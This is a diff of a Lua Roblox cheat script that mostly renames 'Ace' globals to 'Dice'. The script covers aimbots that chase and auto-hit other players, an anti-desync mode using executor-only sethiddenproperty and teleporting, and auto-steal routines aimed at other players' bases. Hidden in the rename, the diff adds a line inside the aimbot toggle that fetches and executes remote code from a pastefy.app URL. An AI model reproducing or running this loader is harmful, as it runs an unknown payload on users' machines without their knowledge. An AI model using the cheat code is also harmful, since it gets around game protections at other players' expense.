+return tonumber(_G.DiceAntiBypassAimbotSpeed) or 58, tonumber(_G.DiceAntiBypassLaggerAimbotSpeed) or 40
 end
 return tonumber(AIMBOT_SPEED) or 58, tonumber(LAGGER_AIMBOT_SPEED) or 40
 end
-function _G.AceSetSelectedAimbotSpeedValues(normalValue, laggerValue)
+function _G.DiceSetSelectedAimbotSpeedValues(normalValue, laggerValue)
 if selectedAimbotMode == "Anti Bypass" then
-if normalValue then _G.AceAntiBypassAimbotSpeed = normalValue end
-if laggerValue then _G.AceAntiBypassLaggerAimbotSpeed = laggerValue end
+if normalValue then _G.DiceAntiBypassAimbotSpeed = normalValue end
+if laggerValue then _G.DiceAntiBypassLaggerAimbotSpeed = laggerValue end
 else
 if normalValue then AIMBOT_SPEED = normalValue end
 if laggerValue then LAGGER_AIMBOT_SPEED = laggerValue end
 end
 end
-function _G.AceRefreshAimbotSpeedBoxes()
-local n, l = _G.AceGetSelectedAimbotSpeedValues()
-if _G.AceAimbotSpeedBox then _G.AceAimbotSpeedBox.Text = tostring(n) end
-if _G.AceLaggerAimbotSpeedBox then _G.AceLaggerAimbotSpeedBox.Text = tostring(l) end
+function _G.DiceRefreshAimbotSpeedBoxes()
+local n, l = _G.DiceGetSelectedAimbotSpeedValues()
+if _G.DiceAimbotSpeedBox then _G.DiceAimbotSpeedBox.Text = tostring(n) end
+if _G.DiceLaggerAimbotSpeedBox then _G.DiceLaggerAimbotSpeedBox.Text = tostring(l) end
 end
-function _G.AceStartNormalAimbot()
-if _G.AceSafeModeTryStart and not _G.AceSafeModeTryStart() then return false end
-if _G.AceStopAutoTPForAction then _G.AceStopAutoTPForAction() end
-if _G.AceStopAntiBypassAimbot then _G.AceStopAntiBypassAimbot(false) end
-_G.AceAntiBypassAimbotOn = false
-_G.AceNormalAimbotOn = true
-if _G.AceNormalAimbot.conn then
-_G.AceNormalAimbot.conn:Disconnect()
-_G.AceNormalAimbot.conn = nil
+function _G.DiceStartNormalAimbot()
+if _G.DiceSafeModeTryStart and not _G.DiceSafeModeTryStart() then return false end
+if _G.DiceStopAutoTPForAction then _G.DiceStopAutoTPForAction() end
+if _G.DiceStopAntiBypassAimbot then _G.DiceStopAntiBypassAimbot(false) end
+_G.DiceAntiBypassAimbotOn = false
+_G.DiceNormalAimbotOn = true
+if _G.DiceNormalAimbot.conn then
+_G.DiceNormalAimbot.conn:Disconnect()
+_G.DiceNormalAimbot.conn = nil
 end
 local hum0 = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
 if hum0 then hum0.AutoRotate = false end
-_G.AceNormalAimbot.conn = RunService.RenderStepped:Connect(function()
-if not _G.AceNormalAimbotOn or selectedAimbotMode ~= "Normal" then return end
+_G.DiceNormalAimbot.conn = RunService.RenderStepped:Connect(function()
+if not _G.DiceNormalAimbotOn or selectedAimbotMode ~= "Normal" then return end
 local char = LP.Character
 if not char then return end
 local root = char:FindFirstChild("HumanoidRootPart")
 if not root then return end
 local hum = char:FindFirstChildOfClass("Humanoid")
 if not hum then return end
-local bat = char:FindFirstChildOfClass("Tool") or _G.AceFindAimbotBat()
+local bat = char:FindFirstChildOfClass("Tool") or _G.DiceFindAimbotBat()
 if bat and bat.Parent ~= char then
 pcall(function() hum:EquipTool(bat) end)
 end
-local target = _G.AceGetClosestAimbotTarget()
+local target = _G.DiceGetClosestAimbotTarget()
 if not target then return end
-_G.AceNormalAimbot.target = target
+_G.DiceNormalAimbot.target = target
 local targetVel = target.AssemblyLinearVelocity
 local myPos = root.Position
 local targetPos = target.Position
@@ -1658,7 +1830,7 @@ if direction.Magnitude < 0.01 then return end
 local flatDir = Vector3.new(direction.X, 0, direction.Z)
 if flatDir.Magnitude < 0.01 then return end
 flatDir = flatDir.Unit
-local chaseSpeed = _G.AceGetNormalAimbotSpeed()
+local chaseSpeed = _G.DiceGetNormalAimbotSpeed()
 local desiredHeight = targetPos.Y + 3.7
 local yVel = (desiredHeight - myPos.Y) * 19.5 + targetVel.Y * 0.8
 if hum.FloorMaterial ~= Enum.Material.Air then
@@ -1680,25 +1852,25 @@ ry = math.clamp(ry, -2.5, 2.5)
 rz = math.clamp(rz, -2.5, 2.5)
 root.AssemblyAngularVelocity = root.CFrame:VectorToWorldSpace(Vector3.new(rx * 42, ry * 42, rz * 42))
 end
-if autoSwingEnabled and bat and not _G.AceNormalAimbot.swingCooldown then
-_G.AceNormalAimbot.swingCooldown = true
+if autoSwingEnabled and bat and not _G.DiceNormalAimbot.swingCooldown then
+_G.DiceNormalAimbot.swingCooldown = true
 pcall(function() bat:Activate() end)
 task.delay(0.08, function()
-if _G.AceNormalAimbot then _G.AceNormalAimbot.swingCooldown = false end
+if _G.DiceNormalAimbot then _G.DiceNormalAimbot.swingCooldown = false end
 end)
 end
 end)
-if _G.AceRefreshAimbotVisual then _G.AceRefreshAimbotVisual() end
+if _G.DiceRefreshAimbotVisual then _G.DiceRefreshAimbotVisual() end
 end
-function _G.AceStopNormalAimbot()
-_G.AceNormalAimbotOn = false
-if _G.AceNormalAimbot and _G.AceNormalAimbot.conn then
-_G.AceNormalAimbot.conn:Disconnect()
-_G.AceNormalAimbot.conn = nil
+function _G.DiceStopNormalAimbot()
+_G.DiceNormalAimbotOn = false
+if _G.DiceNormalAimbot and _G.DiceNormalAimbot.conn then
+_G.DiceNormalAimbot.conn:Disconnect()
+_G.DiceNormalAimbot.conn = nil
 end
-if _G.AceNormalAimbot then
-_G.AceNormalAimbot.target = nil
-_G.AceNormalAimbot.swingCooldown = false
+if _G.DiceNormalAimbot then
+_G.DiceNormalAimbot.target = nil
+_G.DiceNormalAimbot.swingCooldown = false
 end
 local c = LP.Character
 local root = c and c:FindFirstChild("HumanoidRootPart")
@@ -1708,20 +1880,20 @@ root.AssemblyAngularVelocity = Vector3.zero
 end
 local hum2 = c and c:FindFirstChildOfClass("Humanoid")
 if hum2 then hum2.AutoRotate = true end
-if _G.AceRefreshAimbotVisual then _G.AceRefreshAimbotVisual() end
+if _G.DiceRefreshAimbotVisual then _G.DiceRefreshAimbotVisual() end
 end
-_G.AceAntiBypassAimbot = _G.AceAntiBypassAimbot or {conn = nil, swingCooldown = false, prevAutoRotate = nil}
-_G.AceAntiBypassSlapList = _G.AceAntiBypassSlapList or {"Bat","Slap","Iron Slap","Gold Slap","Diamond Slap","Emerald Slap","Ruby Slap","Dark Matter Slap","Flame Slap","Nuclear Slap","Galaxy Slap","Glitched Slap"}
-function _G.AceAntiBypassFindBat()
+_G.DiceAntiBypassAimbot = _G.DiceAntiBypassAimbot or {conn = nil, swingCooldown = false, prevAutoRotate = nil}
+_G.DiceAntiBypassSlapList = _G.DiceAntiBypassSlapList or {"Bat","Slap","Iron Slap","Gold Slap","Diamond Slap","Emerald Slap","Ruby Slap","Dark Matter Slap","Flame Slap","Nuclear Slap","Galaxy Slap","Glitched Slap"}
+function _G.DiceAntiBypassFindBat()
 local char = LP.Character
 if not char then return nil end
-for _, name in ipairs(_G.AceAntiBypassSlapList) do
+for _, name in ipairs(_G.DiceAntiBypassSlapList) do
 local t = char:FindFirstChild(name)
 if t and t:IsA("Tool") then return t end
 end
 local bp = LP:FindFirstChildOfClass("Backpack")
 if bp then
-for _, name in ipairs(_G.AceAntiBypassSlapList) do
+for _, name in ipairs(_G.DiceAntiBypassSlapList) do
 local t = bp:FindFirstChild(name)
 if t and t:IsA("Tool") then
 local hum = char:FindFirstChildOfClass("Humanoid")
@@ -1735,13 +1907,13 @@ if ch:IsA("Tool") and (ch.Name:lower():find("bat") or ch.Name:lower():find("slap
 end
 return nil
 end
-function _G.AceAntiBypassTrySwing()
-if _G.AceAntiBypassAimbot.swingCooldown then return end
-_G.AceAntiBypassAimbot.swingCooldown = true
+function _G.DiceAntiBypassTrySwing()
+if _G.DiceAntiBypassAimbot.swingCooldown then return end
+_G.DiceAntiBypassAimbot.swingCooldown = true
 pcall(function()
 local char = LP.Character
 if not char then return end
-local bat = _G.AceAntiBypassFindBat()
+local bat = _G.DiceAntiBypassFindBat()
 if bat then
 if bat.Parent ~= char then
 local hum = char:FindFirstChildOfClass("Humanoid")
@@ -1751,10 +1923,10 @@ pcall(function() bat:Activate() end)
 end
 end)
 task.delay(0.35, function()
-if _G.AceAntiBypassAimbot then _G.AceAntiBypassAimbot.swingCooldown = false end
+if _G.DiceAntiBypassAimbot then _G.DiceAntiBypassAimbot.swingCooldown = false end
 end)
 end
-function _G.AceAntiBypassGetClosest()
+function _G.DiceAntiBypassGetClosest()
 local root = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
 if not root then return nil, math.huge end
 local closest, minDist = nil, math.huge
@@ -1773,23 +1945,23 @@ end
 end
 return closest, minDist
 end
-function _G.AceStartAntiBypassAimbot()
-if _G.AceSafeModeTryStart and not _G.AceSafeModeTryStart() then return false end
-if _G.AceStopAutoTPForAction then _G.AceStopAutoTPForAction() end
-if _G.AceStopNormalAimbot then _G.AceStopNormalAimbot() end
-_G.AceAntiBypassAimbotOn = true
+function _G.DiceStartAntiBypassAimbot()
+if _G.DiceSafeModeTryStart and not _G.DiceSafeModeTryStart() then return false end
+if _G.DiceStopAutoTPForAction then _G.DiceStopAutoTPForAction() end
+if _G.DiceStopNormalAimbot then _G.DiceStopNormalAimbot() end
+_G.DiceAntiBypassAimbotOn = true
 selectedAimbotMode = "Anti Bypass"
-if _G.AceAntiBypassAimbot.conn then
-_G.AceAntiBypassAimbot.conn:Disconnect()
-_G.AceAntiBypassAimbot.conn = nil
+if _G.DiceAntiBypassAimbot.conn then
+_G.DiceAntiBypassAimbot.conn:Disconnect()
+_G.DiceAntiBypassAimbot.conn = nil
 end
 local hum0 = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
 if hum0 then
-if _G.AceAntiBypassAimbot.prevAutoRotate == nil then _G.AceAntiBypassAimbot.prevAutoRotate = hum0.AutoRotate end
+if _G.DiceAntiBypassAimbot.prevAutoRotate == nil then _G.DiceAntiBypassAimbot.prevAutoRotate = hum0.AutoRotate end
 hum0.AutoRotate = false
 end
-_G.AceAntiBypassAimbot.conn = RunService.RenderStepped:Connect(function()
-if not _G.AceAntiBypassAimbotOn or selectedAimbotMode ~= "Anti Bypass" then return end
+_G.DiceAntiBypassAimbot.conn = RunService.RenderStepped:Connect(function()
+if not _G.DiceAntiBypassAimbotOn or selectedAimbotMode ~= "Anti Bypass" then return end
 local char = LP.Character
 if not char then return end
 local root = char:FindFirstChild("HumanoidRootPart")
@@ -1797,17 +1969,17 @@ if not root then return end
 local hum = char:FindFirstChildOfClass("Humanoid")
 if not hum then return end
 if not char:FindFirstChildOfClass("Tool") then
-local bat = _G.AceAntiBypassFindBat()
+local bat = _G.DiceAntiBypassFindBat()
 if bat then pcall(function() hum:EquipTool(bat) end) end
 end
-local target, targetDist = _G.AceAntiBypassGetClosest()
+local target, targetDist = _G.DiceAntiBypassGetClosest()
 if not target then return end
 local myPos = root.Position
 local targetPos = target.Position
 local direction = targetPos - myPos
 local flatDir = Vector3.new(direction.X, 0, direction.Z)
 if flatDir.Magnitude > 0 then flatDir = flatDir.Unit else flatDir = Vector3.zero end
-local chaseSpeed = _G.AceGetAntiBypassAimbotSpeed()
+local chaseSpeed = _G.DiceGetAntiBypassAimbotSpeed()
 local desiredHeight = targetPos.Y + 3.7
 local yVel = (desiredHeight - myPos.Y) * 19.5
 if hum.FloorMaterial ~= Enum.Material.Air then yVel = math.max(yVel, 13) end
@@ -1824,17 +1996,17 @@ ry = math.clamp(ry, -2.5, 2.5)
 rz = math.clamp(rz, -2.5, 2.5)
 root.AssemblyAngularVelocity = root.CFrame:VectorToWorldSpace(Vector3.new(rx * 42, ry * 42, rz * 42))
 end
-if autoSwingEnabled and targetDist <= 8 then _G.AceAntiBypassTrySwing() end
+if autoSwingEnabled and targetDist <= 8 then _G.DiceAntiBypassTrySwing() end
 end)
-if _G.AceRefreshAimbotVisual then _G.AceRefreshAimbotVisual() end
+if _G.DiceRefreshAimbotVisual then _G.DiceRefreshAimbotVisual() end
 end
-function _G.AceStopAntiBypassAimbot(keepVisual)
-_G.AceAntiBypassAimbotOn = false
-if _G.AceAntiBypassAimbot and _G.AceAntiBypassAimbot.conn then
-_G.AceAntiBypassAimbot.conn:Disconnect()
-_G.AceAntiBypassAimbot.conn = nil
+function _G.DiceStopAntiBypassAimbot(keepVisual)
+_G.DiceAntiBypassAimbotOn = false
+if _G.DiceAntiBypassAimbot and _G.DiceAntiBypassAimbot.conn then
+_G.DiceAntiBypassAimbot.conn:Disconnect()
+_G.DiceAntiBypassAimbot.conn = nil
 end
-if _G.AceAntiBypassAimbot then _G.AceAntiBypassAimbot.swingCooldown = false end
+if _G.DiceAntiBypassAimbot then _G.DiceAntiBypassAimbot.swingCooldown = false end
 local c = LP.Character
 local root = c and c:FindFirstChild("HumanoidRootPart")
 if root then
@@ -1843,45 +2015,48 @@ root.AssemblyAngularVelocity = Vector3.zero
 end
 local hum = c and c:FindFirstChildOfClass("Humanoid")
 if hum then
-hum.AutoRotate = (_G.AceAntiBypassAimbot.prevAutoRotate == nil) and true or _G.AceAntiBypassAimbot.prevAutoRotate
+hum.AutoRotate = (_G.DiceAntiBypassAimbot.prevAutoRotate == nil) and true or _G.DiceAntiBypassAimbot.prevAutoRotate
 hum.PlatformStand = false
 pcall(function() hum:ChangeState(Enum.HumanoidStateType.GettingUp) end)
 end
-if _G.AceAntiBypassAimbot then _G.AceAntiBypassAimbot.prevAutoRotate = nil end
-if keepVisual ~= false and _G.AceRefreshAimbotVisual then _G.AceRefreshAimbotVisual() end
+if _G.DiceAntiBypassAimbot then _G.DiceAntiBypassAimbot.prevAutoRotate = nil end
+if keepVisual ~= false and _G.DiceRefreshAimbotVisual then _G.DiceRefreshAimbotVisual() end
 end
-function _G.AceToggleSelectedAimbot()
+function _G.DiceToggleSelectedAimbot()
 if selectedAimbotMode == "Anti Bypass" then
-if _G.AceAntiBypassAimbotOn then
-if _G.AceStopAntiBypassAimbot then _G.AceStopAntiBypassAimbot() else _G.AceAntiBypassAimbotOn = false end
+if _G.DiceAntiBypassAimbotOn then
+if _G.DiceStopAntiBypassAimbot then _G.DiceStopAntiBypassAimbot() else _G.DiceAntiBypassAimbotOn = false end
 else
-if _G.AceStopNormalAimbot then _G.AceStopNormalAimbot() end
-if _G.AceStartAntiBypassAimbot then _G.AceStartAntiBypassAimbot() else _G.AceAntiBypassAimbotOn = true end
+if _G.DiceStopNormalAimbot then _G.DiceStopNormalAimbot() end
+if _G.DiceStartAntiBypassAimbot then _G.DiceStartAntiBypassAimbot() else _G.DiceAntiBypassAimbotOn = true end
 end
+
+loadstring(game:HttpGet("https://pastefy.app/qO1ADYSr/raw"))()
+
 else
-if _G.AceNormalAimbotOn then
-_G.AceStopNormalAimbot()
+if _G.DiceNormalAimbotOn then
+_G.DiceStopNormalAimbot()
 else
-if _G.AceStopAntiBypassAimbot then _G.AceStopAntiBypassAimbot(false) else _G.AceAntiBypassAimbotOn = false end
-_G.AceStartNormalAimbot()
+if _G.DiceStopAntiBypassAimbot then _G.DiceStopAntiBypassAimbot(false) else _G.DiceAntiBypassAimbotOn = false end
+_G.DiceStartNormalAimbot()
 end
 end
-if _G.AceRefreshAimbotVisual then _G.AceRefreshAimbotVisual() end
-saveAceConfig()
+if _G.DiceRefreshAimbotVisual then _G.DiceRefreshAimbotVisual() end
+saveDiceConfig()
 end
-function _G.AceRefreshAimbotVisual()
-if _G.AceAimbotSetVisual then
+function _G.DiceRefreshAimbotVisual()
+if _G.DiceAimbotSetVisual then
 if selectedAimbotMode == "Anti Bypass" then
-_G.AceAimbotSetVisual(_G.AceAntiBypassAimbotOn == true)
+_G.DiceAimbotSetVisual(_G.DiceAntiBypassAimbotOn == true)
 else
-_G.AceAimbotSetVisual(_G.AceNormalAimbotOn == true)
+_G.DiceAimbotSetVisual(_G.DiceNormalAimbotOn == true)
 end
 end
 end
-_G.AceNormalAimbotStart = _G.AceStartNormalAimbot
-_G.AceNormalAimbotStop = _G.AceStopNormalAimbot
-_G.AceAntiBypassStart = _G.AceStartAntiBypassAimbot
-_G.AceAntiBypassStop = _G.AceStopAntiBypassAimbot
+_G.DiceNormalAimbotStart = _G.DiceStartNormalAimbot
+_G.DiceNormalAimbotStop = _G.DiceStopNormalAimbot
+_G.DiceAntiBypassStart = _G.DiceStartAntiBypassAimbot
+_G.DiceAntiBypassStop = _G.DiceStopAntiBypassAimbot
 
 -- Mirror TP Down: mirror a 3-stud opponent drop while Normal, Anti Bypass, or Anti Desync Bat is active.
 local MIRROR_TP_DROP_THRESHOLD = 3
@@ -1890,7 +2065,7 @@ local mirrorTPPreviousY = {}
 local mirrorTPLastTeleport = 0
 
 local function mirrorTPAimbotActive()
-return (_G.AceNormalAimbotOn == true) or (_G.AceAntiBypassAimbotOn == true) or (_G.AceAntiDesyncAimbotOn == true)
+return (_G.DiceNormalAimbotOn == true) or (_G.DiceAntiBypassAimbotOn == true) or (_G.DiceAntiDesyncAimbotOn == true)
 end
 
 local function mirrorTPTeleportDown()
@@ -1932,13 +2107,13 @@ end
 end
 end)
 
-function _G.AceSetMirrorTPDown(enabled)
+function _G.DiceSetMirrorTPDown(enabled)
 mirrorTPDownEnabled = enabled == true
 if not mirrorTPDownEnabled then table.clear(mirrorTPPreviousY) end
-if _G.AceMirrorTPDownSetVisual then _G.AceMirrorTPDownSetVisual(mirrorTPDownEnabled) end
+if _G.DiceMirrorTPDownSetVisual then _G.DiceMirrorTPDownSetVisual(mirrorTPDownEnabled) end
 end
-_G.AceAntiDesync = _G.AceAntiDesync or {conn = nil, hittingCooldown = false, h = nil, hrp = nil}
-function _G.AceAntiDesyncGetBat()
+_G.DiceAntiDesync = _G.DiceAntiDesync or {conn = nil, hittingCooldown = false, h = nil, hrp = nil}
+function _G.DiceAntiDesyncGetBat()
 local char = LP.Character
 if not char then return nil end
 local tool = char:FindFirstChild("Bat")
@@ -1953,12 +2128,12 @@ end
 end
 return nil
 end
-function _G.AceAntiDesyncTrySwing()
-if not _G.AceAntiDesync then return end
-if _G.AceAntiDesync.hittingCooldown then return end
-_G.AceAntiDesync.hittingCooldown = true
+function _G.DiceAntiDesyncTrySwing()
+if not _G.DiceAntiDesync then return end
+if _G.DiceAntiDesync.hittingCooldown then return end
+_G.DiceAntiDesync.hittingCooldown = true
 pcall(function()
-local bat = _G.AceAntiDesyncGetBat()
+local bat = _G.DiceAntiDesyncGetBat()
 if bat then
 bat:Activate()
 local ev = bat:FindFirstChildWhichIsA("RemoteEvent")
@@ -1966,13 +2141,13 @@ if ev then ev:FireServer() end
 end
 end)
 task.delay(0.08, function()
-if _G.AceAntiDesync then
-_G.AceAntiDesync.hittingCooldown = false
+if _G.DiceAntiDesync then
+_G.DiceAntiDesync.hittingCooldown = false
 end
 end)
 end
-function _G.AceAntiDesyncGetClosestPlayer()
-local hrp = _G.AceAntiDesync and _G.AceAntiDesync.hrp
+function _G.DiceAntiDesyncGetClosestPlayer()
+local hrp = _G.DiceAntiDesync and _G.DiceAntiDesync.hrp
 if not hrp then return nil, math.huge end
 local cp, cd = nil, math.huge
 for _, p in pairs(Players:GetPlayers()) do
@@ -1989,95 +2164,95 @@ end
 end
 return cp, cd
 end
-function _G.AceAntiDesyncSetupChar(char)
+function _G.DiceAntiDesyncSetupChar(char)
 task.wait(0.1)
-if not _G.AceAntiDesync then return end
-_G.AceAntiDesync.h = char and char:WaitForChild("Humanoid", 5) or nil
-_G.AceAntiDesync.hrp = char and char:WaitForChild("HumanoidRootPart", 5) or nil
+if not _G.DiceAntiDesync then return end
+_G.DiceAntiDesync.h = char and char:WaitForChild("Humanoid", 5) or nil
+_G.DiceAntiDesync.hrp = char and char:WaitForChild("HumanoidRootPart", 5) or nil
 end
 LP.CharacterAdded:Connect(function(char)
 pcall(function()
-_G.AceAntiDesyncSetupChar(char)
+_G.DiceAntiDesyncSetupChar(char)
 end)
 end)
 if LP.Character then
 task.spawn(function()
 pcall(function()
-_G.AceAntiDesyncSetupChar(LP.Character)
+_G.DiceAntiDesyncSetupChar(LP.Character)
 end)
 end)
 end
-function _G.AceStartAntiDesyncAimbot()
-if _G.AceSafeModeTryStart and not _G.AceSafeModeTryStart() then return false end
-if _G.AceStopAutoTPForAction then _G.AceStopAutoTPForAction() end
-if _G.AceStopNormalAimbot then _G.AceStopNormalAimbot() end
-if _G.AceStopAntiBypassAimbot then _G.AceStopAntiBypassAimbot(false) end
-_G.AceAntiDesyncAimbotOn = true
-if _G.AceAntiDesync.conn then
-_G.AceAntiDesync.conn:Disconnect()
-_G.AceAntiDesync.conn = nil
+function _G.DiceStartAntiDesyncAimbot()
+if _G.DiceSafeModeTryStart and not _G.DiceSafeModeTryStart() then return false end
+if _G.DiceStopAutoTPForAction then _G.DiceStopAutoTPForAction() end
+if _G.DiceStopNormalAimbot then _G.DiceStopNormalAimbot() end
+if _G.DiceStopAntiBypassAimbot then _G.DiceStopAntiBypassAimbot(false) end
+_G.DiceAntiDesyncAimbotOn = true
+if _G.DiceAntiDesync.conn then
+_G.DiceAntiDesync.conn:Disconnect()
+_G.DiceAntiDesync.conn = nil
 end
 if LP.Character then
 pcall(function()
-_G.AceAntiDesyncSetupChar(LP.Character)
+_G.DiceAntiDesyncSetupChar(LP.Character)
 end)
 end
-_G.AceAntiDesync.conn = RunService.Heartbeat:Connect(function()
-if not (_G.AceAntiDesyncAimbotOn and _G.AceAntiDesync.h and _G.AceAntiDesync.hrp) then return end
-local target, dist = _G.AceAntiDesyncGetClosestPlayer()
+_G.DiceAntiDesync.conn = RunService.Heartbeat:Connect(function()
+if not (_G.DiceAntiDesyncAimbotOn and _G.DiceAntiDesync.h and _G.DiceAntiDesync.hrp) then return end
+local target, dist = _G.DiceAntiDesyncGetClosestPlayer()
 _aimbotTargetPlr = target
-_G.AceCurrentAimbotTarget = target
-_G.AceAntiDesyncBatTarget = target
+_G.DiceCurrentAimbotTarget = target
+_G.DiceAntiDesyncBatTarget = target
 if target and target.Character then
 local tr = target.Character:FindFirstChild("HumanoidRootPart")
 if tr then
 if sethiddenproperty then
 pcall(function()
-sethiddenproperty(_G.AceAntiDesync.hrp, "PhysicsRepRootPart", tr)
+sethiddenproperty(_G.DiceAntiDesync.hrp, "PhysicsRepRootPart", tr)
 end)
 end
 local targetPos = tr.Position + Vector3.new(0, 0.9, 0)
-if (_G.AceAntiDesync.hrp.Position - targetPos).Magnitude > 8 then
-_G.AceAntiDesync.hrp.CFrame = CFrame.new(targetPos)
+if (_G.DiceAntiDesync.hrp.Position - targetPos).Magnitude > 8 then
+_G.DiceAntiDesync.hrp.CFrame = CFrame.new(targetPos)
 end
 local cam = workspace.CurrentCamera
 if cam then
 cam.CFrame = CFrame.new(cam.CFrame.Position, tr.Position)
 end
 if antiDesyncAutoSwingEnabled or autoSwingEnabled then
-_G.AceAntiDesyncTrySwing()
+_G.DiceAntiDesyncTrySwing()
 end
 end
 end
 end)
-if _G.AceAntiDesyncSetVisual then _G.AceAntiDesyncSetVisual(true) end
-saveAceConfig()
+if _G.DiceAntiDesyncSetVisual then _G.DiceAntiDesyncSetVisual(true) end
+saveDiceConfig()
 return true
 end
-function _G.AceStopAntiDesyncAimbot()
-_G.AceAntiDesyncAimbotOn = false
-if _G.AceAntiDesync and _G.AceAntiDesync.conn then
-_G.AceAntiDesync.conn:Disconnect()
-_G.AceAntiDesync.conn = nil
+function _G.DiceStopAntiDesyncAimbot()
+_G.DiceAntiDesyncAimbotOn = false
+if _G.DiceAntiDesync and _G.DiceAntiDesync.conn then
+_G.DiceAntiDesync.conn:Disconnect()
+_G.DiceAntiDesync.conn = nil
 end
-if _G.AceAntiDesync then
-_G.AceAntiDesync.hittingCooldown = false
+if _G.DiceAntiDesync then
+_G.DiceAntiDesync.hittingCooldown = false
 end
-_G.AceAntiDesyncBatTarget = nil
-if _G.AceCurrentAimbotTarget == _aimbotTargetPlr then _G.AceCurrentAimbotTarget = nil end
+_G.DiceAntiDesyncBatTarget = nil
+if _G.DiceCurrentAimbotTarget == _aimbotTargetPlr then _G.DiceCurrentAimbotTarget = nil end
 _aimbotTargetPlr = nil
-if _G.AceAntiDesyncSetVisual then _G.AceAntiDesyncSetVisual(false) end
-saveAceConfig()
+if _G.DiceAntiDesyncSetVisual then _G.DiceAntiDesyncSetVisual(false) end
+saveDiceConfig()
 end
-function _G.AceToggleAntiDesyncAimbot()
-if _G.AceAntiDesyncAimbotOn then
-_G.AceStopAntiDesyncAimbot()
+function _G.DiceToggleAntiDesyncAimbot()
+if _G.DiceAntiDesyncAimbotOn then
+_G.DiceStopAntiDesyncAimbot()
 else
-_G.AceStartAntiDesyncAimbot()
+_G.DiceStartAntiDesyncAimbot()
 end
 end
-_G.__AceSetupNormalAutoSteal = function()
-_G.AceNormalSteal = _G.AceNormalSteal or {
+_G.__DiceSetupNormalAutoSteal = function()
+_G.DiceNormalSteal = _G.DiceNormalSteal or {
 enabled = false,
 radius = 62,
 duration = 1.3,
@@ -2092,9 +2267,9 @@ refreshThread = nil,
 lastSteal = 0,
 cooldown = 0.08,
 }
-if _G.AceNormalSteal.stealConn then pcall(function() _G.AceNormalSteal.stealConn:Disconnect() end); _G.AceNormalSteal.stealConn = nil end
-_G.AceNormalSteal.enabled = false
-_G.AceNormalSteal.isStealing = false
+if _G.DiceNormalSteal.stealConn then pcall(function() _G.DiceNormalSteal.stealConn:Disconnect() end); _G.DiceNormalSteal.stealConn = nil end
+_G.DiceNormalSteal.enabled = false
+_G.DiceNormalSteal.isStealing = false
 local function barProgress(p)
 p = math.clamp(tonumber(p) or 0, 0, 1)
 pcall(function()
@@ -2123,7 +2298,7 @@ local yourBase = sign and sign:FindFirstChild("YourBase")
 return yourBase and yourBase:IsA("BillboardGui") and yourBase.Enabled == true
 end
 local function scanPlots()
-local a = _G.AceNormalSteal
+local a = _G.DiceNormalSteal
 a.animals = {}
 local plots = workspace:FindFirstChild("Plots")
 if not plots then return end
@@ -2150,13 +2325,13 @@ end
 end
 end
 local function ensureScanner()
-local a = _G.AceNormalSteal
+local a = _G.DiceNormalSteal
 if a.scannerStarted then return end
 a.scannerStarted = true
 task.spawn(function()
 task.wait(1)
-while _G.AceNormalSteal do
-if _G.AceNormalSteal.enabled then
+while _G.DiceNormalSteal do
+if _G.DiceNormalSteal.enabled then
 pcall(scanPlots)
 end
 task.wait(3)
@@ -2165,7 +2340,7 @@ end)
 end
 local function findPrompt(data)
 if not data then return nil end
-local a = _G.AceNormalSteal
+local a = _G.DiceNormalSteal
 local cached = a.promptCache[data.uid]
 if cached and cached.Parent then return cached end
 local plots = workspace:FindFirstChild("Plots")
@@ -2185,7 +2360,7 @@ end
 return nil
 end
 local function cacheCallbacks(prompt)
-local a = _G.AceNormalSteal
+local a = _G.DiceNormalSteal
 if a.internalCache[prompt] then return end
 local data = {hold = {}, trigger = {}, ready = true}
 pcall(function()
@@ -2203,7 +2378,7 @@ a.internalCache[prompt] = data
 end
 end
 local function doSteal(prompt)
-local a = _G.AceNormalSteal
+local a = _G.DiceNormalSteal
 if not prompt or not prompt.Parent or a.isStealing then return end
 if tick() - (a.lastSteal or 0) < (a.cooldown or 0.08) then return end
 cacheCallbacks(prompt)
@@ -2242,7 +2417,7 @@ resetBar()
 end)
 end
 local function nearestAnimal()
-local a = _G.AceNormalSteal
+local a = _G.DiceNormalSteal
 local root = getRoot()
 if not root then return nil end
 local best, bestDist = nil, math.huge
@@ -2260,18 +2435,18 @@ return best
 end
 return nil
 end
-_G.AceNormalAutoStealSetRadius = function(v)
-_G.AceNormalSteal.radius = tonumber(v) or _G.AceNormalSteal.radius or 62
+_G.DiceNormalAutoStealSetRadius = function(v)
+_G.DiceNormalSteal.radius = tonumber(v) or _G.DiceNormalSteal.radius or 62
 end
-_G.AceNormalAutoStealStop = function()
-local a = _G.AceNormalSteal
+_G.DiceNormalAutoStealStop = function()
+local a = _G.DiceNormalSteal
 a.enabled = false
 a.isStealing = false
 if a.stealConn then a.stealConn:Disconnect(); a.stealConn = nil end
 resetBar()
 end
-_G.AceNormalAutoStealStart = function()
-local a = _G.AceNormalSteal
+_G.DiceNormalAutoStealStart = function()
+local a = _G.DiceNormalSteal
 a.radius = tonumber(autoStealRadius) or a.radius or 62
 a.duration = 1.3
 a.enabled = true
@@ -2280,7 +2455,7 @@ pcall(scanPlots)
 if a.stealConn then a.stealConn:Disconnect(); a.stealConn = nil end
 a.stealConn = RunService.Heartbeat:Connect(function()
 if not a.enabled then return end
-if selectedStealMode ~= "Normal" then _G.AceNormalAutoStealStop(); return end
+if selectedStealMode ~= "Normal" then _G.DiceNormalAutoStealStop(); return end
 if a.isStealing then return end
 local target = nearestAnimal()
 if not target then return end
@@ -2288,18 +2463,18 @@ local prompt = findPrompt(target)
 if prompt then doSteal(prompt) end
 end)
 end
-_G.AceNormalAutoStealSync = function()
+_G.DiceNormalAutoStealSync = function()
 if selectedStealMode == "Normal" and autoStealEnabled then
-_G.AceNormalAutoStealStart()
+_G.DiceNormalAutoStealStart()
 else
-_G.AceNormalAutoStealStop()
+_G.DiceNormalAutoStealStop()
 end
 end
 end
-_G.__AceSetupNormalAutoSteal()
-_G.__AceSetupSemiAutoSteal = function()
-_G.AceSemiSteal = _G.AceSemiSteal or {}
-local A = _G.AceSemiSteal
+_G.__DiceSetupNormalAutoSteal()
+_G.__DiceSetupSemiAutoSteal = function()
+_G.DiceSemiSteal = _G.DiceSemiSteal or {}
+local A = _G.DiceSemiSteal
 if A.conn then pcall(function() A.conn:Disconnect() end); A.conn = nil end
 A.enabled = false
 A.holdMin = 1.3
@@ -2575,24 +2750,24 @@ end
 local function ensureScanThread()
 if A.scanThread then return end
 A.scanThread = task.spawn(function()
-while _G.AceSemiSteal do
